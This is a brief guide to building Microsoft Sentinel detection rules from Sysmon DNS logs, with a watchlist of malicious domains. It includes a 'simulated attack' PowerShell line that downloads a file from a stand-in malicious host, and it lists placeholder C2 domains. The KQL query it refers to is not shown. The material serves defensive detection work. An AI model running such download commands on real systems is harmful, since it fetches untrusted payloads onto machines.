
# Threat Hunting Guide — Custom Detection-as-Code (Sysmon + Sentinel)

## Objective

Create custom detection rules using **Sysmon logs + KQL** inside Microsoft Sentinel, targeting specific MITRE ATT&CK techniques. Incorporate watchlists for dynamic IOC correlation.

---

## 🛠️ Tools Used

| Tool / Component           | Purpose                                      |
|---------------------------|----------------------------------------------|
| Sysmon                    | Generate endpoint telemetry (DNS, process)   |
| Microsoft Sentinel        | SIEM for detection and response              |
| KQL                       | Query language to build analytics rules      |
| MITRE ATT&CK              | Mapping tactics/techniques to detections     |
| Watchlists                | Store malicious domains as IOCs              |
| Azure Monitor Agent       | Forwards Sysmon logs to Sentinel             |

---

## 🧪 Simulation Setup

### Simulated Attack:

```powershell
Invoke-WebRequest -Uri http://maliciousdomain.com -OutFile C:\temp\data.zip
```

📌 This triggers:
- **Sysmon Event ID 22**: DNS query to malicious domain




## 🛡️ Detection Rule Setup (Scheduled Query)

1. Go to: **Microsoft Sentinel > Analytics > + Create**
2. Type: **Scheduled Query Rule**
3. Paste the KQL
4. Set:
   - Frequency: Every 5 minutes
   - Lookup Period: Last 5 minutes
   - Severity: High
   - MITRE tactic (e.g., Command & Control, Exfiltration)
5. Enable **Incident Creation**
6. Add **Entity Mapping**:
   - `Computer → Computer`

---

## Watchlist Configuration

1. File name: `M-Domains.csv`
2. Columns:
   ```csv
   MaliciousDomains
   maliciousdomain.com
   evilc2.com
   fakebank.net
   ```
3. Upload via:
   - Sentinel → Configuration → Watchlist → + New
   - Watchlist name: `M-Domains`
   - Alias: `MaliciousDomains`

---

## ✅ Validation Steps

1. Run `Invoke-WebRequest` on listed domains
2. Confirm Event ID 22 is generated in the VM
3. Use Sentinel → Logs → Run KQL queries
4. Verify alerts are generated from Analytics Rules
5. Confirm Incidents appear under Sentinel → Incidents

---

---
